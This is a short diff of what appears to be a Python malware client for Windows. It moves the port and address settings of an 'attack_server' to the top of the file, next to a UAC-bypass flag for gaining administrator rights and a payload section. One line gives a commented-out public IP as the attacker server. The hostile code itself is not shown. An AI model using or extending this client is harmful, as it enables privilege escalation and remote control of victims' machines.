@@ -4,6 +4,9 @@ import win32com.shell.shell as shell
 
 DEBUG=True
 UAC_BYPASS=False
+port = 9001  #port of attack_server
+host_addr = "127.0.0.1" #host_addr = "175.192.214.36" #address of attack_server
+
 ### UAC to get Admins
 
 def debug_print(str):
@@ -95,9 +98,7 @@ if(UAC_BYPASS):
 #### payload
 
 
-port = 9001 #port of attack_server
-#host_addr = "175.192.214.36" #address of attack_server
-host_addr = "127.0.0.1" 
+
 debug_print("client start...")
 
 
